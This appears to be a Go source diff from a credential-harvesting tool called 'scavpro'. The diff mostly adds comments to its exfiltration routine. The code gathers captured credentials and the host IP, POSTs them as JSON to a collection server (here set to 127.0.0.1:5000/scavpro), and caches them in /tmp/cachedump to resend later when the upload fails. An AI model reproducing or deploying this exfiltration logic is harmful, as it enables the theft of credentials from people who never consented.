@@ -19,11 +19,11 @@ var serv = "127.0.0.1:5000" //IP of server
 // to the web server.  If the POST request fails, write the cache data to
 // a file in temp, so it can be shipped later
 func sendData(c *cred_cache.CredCache) {
-	path := "/tmp/cachedump"
+	path := "/tmp/cachedump" // path to write data to if sending fails
 	ip := c.GetIP()
 	creds := c.GetEntries()
 	previousDump := fetchDump(path)
-	if previousDump != nil {
+	if previousDump != nil { // read any creds we missed from the old dump
 		for _, c := range previousDump {
 			tmp := stringInSlice(c, creds)
 			if tmp != true {
@@ -37,15 +37,14 @@ func sendData(c *cred_cache.CredCache) {
 	}
 	url := "http://" + serv + "/scavpro" //turn ip into URL
 	jsonData := map[string]string{"IP": ip, "credentials": credStr}
-	jsonValue, _ := json.Marshal(jsonData)
-	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
-	if err != nil {
-		// TODO: write to disk if it fails
+	jsonValue, _ := json.Marshal(jsonData)                                   // what are you silly?
+	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue)) // send it!
+	if err != nil {                                                          // if error with sending, write cache to disk
 		path := "/tmp/cachedump"
 		dumpCache(creds, path)
 		return
 	}
-	c.ClearEntries() // reset credential entries in cache
+	c.ClearEntries() // reset cred entries in cache
 	return
 
 }
@@ -55,11 +54,10 @@ func sendData(c *cred_cache.CredCache) {
 func dumpCache(creds []string, path string) {
 	cstr := ""
 	for _, cred := range creds {
-		cstr += cred + "\n"
+		cstr += cred + "\n" // make into a looong string
 	}
-	cbytes := []byte(cstr)
-	ioutil.WriteFile(path, cbytes, 0644)
-
+	cbytes := []byte(cstr)               // make it bytes
+	ioutil.WriteFile(path, cbytes, 0644) // write it
 	return
 }
 
@@ -68,18 +66,19 @@ func dumpCache(creds []string, path string) {
 func fetchDump(path string) []string {
 	f, err := os.Open(path)
 	if err != nil {
-		return nil
+		return nil // nil if there's no credential dump written to disk
 	}
 	defer f.Close()
 	var data []string
 	scanner := bufio.NewScanner(f)
-	for scanner.Scan() {
+	for scanner.Scan() { // read the cred dump into a []string
 		data = append(data, scanner.Text())
 	}
 
 	return data
 }
 
+// return true if a string exists in a slice
 func stringInSlice(a string, slc []string) bool {
 	for _, b := range slc {
 		if b == a {
